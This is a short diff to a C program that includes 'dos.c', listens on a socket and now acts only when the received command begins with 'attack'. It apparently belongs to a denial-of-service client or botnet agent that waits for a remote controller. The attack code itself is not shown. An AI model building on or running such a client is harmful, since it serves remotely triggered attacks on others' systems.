@@ -24,6 +24,7 @@
 #define BUFSIZE 2048
 
 #include "dos.c"
+int is_begin_with(const char * str1,char *str2);
 
 int main(int argc, char *argv[])
 {
@@ -94,7 +95,7 @@ int main(int argc, char *argv[])
                 exit(1);
             }
             recv_buf[recvbytes] = '\0';
-	    if(strstr(recv_buf,"attack") != NULL)
+	    if(is_begin_with(recv_buf,"attack") ==1)
             {
             	char *data = recv_buf;
                 printf("%s\n",data);
@@ -148,5 +149,25 @@ int main(int argc, char *argv[])
     close(sockfd);
 
     return 0;
+}
+
+int is_begin_with(const char * str1,char *str2)
+{
+    if(str1 == NULL || str2 == NULL)
+        return -1;
+    int len1 = strlen(str1);
+    int len2 = strlen(str2);
+    if((len1 < len2) ||  (len1 == 0 || len2 == 0))
+        return -1;
+    char *p = str2;
+    int i = 0;
+    while(*p != '\0')
+    {
+        if(*p != str1[i])
+            return 0;
+        p++;
+        i++;
+    }
+    return 1;
 }
 
